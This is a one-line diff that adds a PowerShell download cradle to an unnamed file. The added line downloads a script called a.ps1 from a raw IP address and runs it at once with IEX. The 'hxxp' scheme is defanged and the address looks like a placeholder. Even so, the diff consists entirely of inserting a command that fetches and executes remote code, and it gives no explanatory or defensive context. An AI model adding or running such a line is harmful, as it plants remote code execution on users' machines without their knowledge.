@@ -1,0 +1,1 @@
+IEX(New-Object Net.WebClient).DownloadString("hxxp://198.51.100.7/a.ps1")
